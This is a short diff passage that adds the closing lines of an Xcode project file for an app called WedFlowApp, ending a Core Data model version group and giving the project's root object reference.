+			path = WedFlowApp.xcdatamodeld;
+			sourceTree = "<group>";
+			versionGroupType = wrapper.xcdatamodel;
+		};
+/* End XCVersionGroup section */
+	};
+	rootObject = 8396095D24A98803000AB018 /* Project object */;
+}
